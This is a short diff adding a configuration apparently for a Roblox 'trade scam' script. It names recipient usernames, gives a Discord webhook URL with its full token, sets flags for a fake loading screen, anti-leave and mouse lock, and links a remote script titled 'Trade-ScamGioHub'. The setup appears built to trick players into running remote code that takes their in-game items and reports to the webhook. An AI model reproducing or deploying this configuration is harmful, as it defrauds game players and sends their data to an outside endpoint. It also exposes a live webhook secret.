@@ -1,0 +1,9 @@
+UserName = "Donvaska111"
+Webhook = "https://discord.com/api/webhooks/1181950729448071240/VddZfOTXYxMUALC4j0ikEky36ATxQea_8jROBVfgeCXIutu02W4u5AToD7BgM4RmzOhe"
+UserName2 = "Pro_Gamer11S"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+https://raw.githubusercontent.com/Giorgi0ku/Trade-scamm/main/Trade-ScamGioHub
